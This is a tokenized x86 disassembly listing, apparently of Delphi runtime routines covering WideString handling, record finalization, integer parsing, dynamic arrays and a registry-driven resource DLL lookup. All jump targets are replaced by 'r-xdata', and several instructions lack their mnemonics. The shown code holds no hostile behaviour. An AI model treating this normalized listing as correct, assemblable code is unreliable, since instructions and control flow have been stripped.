add eax edi
call sub_4028e8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028e8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404768
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4047b0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404164
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404228
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40272c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028e8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40485c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404880
test edx edx
je sub_404844
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404844
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
retn
sub_4048a4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404844
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404a8c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4042a4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4042a4
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404a8c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404930
jmp r-xdata
sub_404930
test ecx ecx
je sub_404844
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404954
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404930
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4049bc
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404a40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4049b0
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404930
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404a8c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404834
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40481c
mov ebx eax
mov eax [ edi ]
call sub_4049b0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028e8
mov eax esi
sub_404ad0
mov edx [ eax ]
test edx edx
je r-xdata
retn
push eax
mov ecx [ edx - 0x4 ]
shr ecx 0x1
push ecx
push edx
call SysAllocStringLen
pop edx
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
mov [ edx ] eax
sub_404af0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404b20
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404b20
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404b20
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404af0
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404bb4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404c00
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404c00
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404188
jmp r-xdata
call sub_404164
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40485c
jmp r-xdata
call sub_404844
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404be8
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404c00
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404bb4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405b04
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_40544c
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402848
sub_404cf8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404d40
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404d40
push ebx
push esi
push edi
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_404614
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_404ad0
dec edi
jg r-xdata
cmp al 0xc
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404d28
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404d40
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404cf8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_405b78
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_4054b0
dec edi
jg r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404e18
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028e8
mov edx [ eax + esi ]
add eax ebx
call sub_4041b8
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404880
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404e00
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028e8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404f34
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404e18
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405b1c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405488
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404f34
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4041b8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404880
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404e00
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404f34
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404e18
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405b1c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405488
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_405030
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_405054
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402ad4
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402ad4
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_405030
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_4052b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4052ac
jmp r-xdata
mov al 0x4
call sub_402848
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402848
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40272c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402d24
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404c00
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028e8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402d24
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405294
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4052b4
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_40544c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_40270c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404c00
sub_405488
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_40544c
pop edx
pop eax
sub_4054bc
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012fc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4054ec
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40128c
mov eax esp
mov dl 0x1
call sub_405728
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405534
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4054ec
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405570
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401294
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40129c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_40555c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_40555c
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_40555c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40126c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401264
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405728
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40128c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40582d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405570
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012ac
push eax
call sub_401284
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
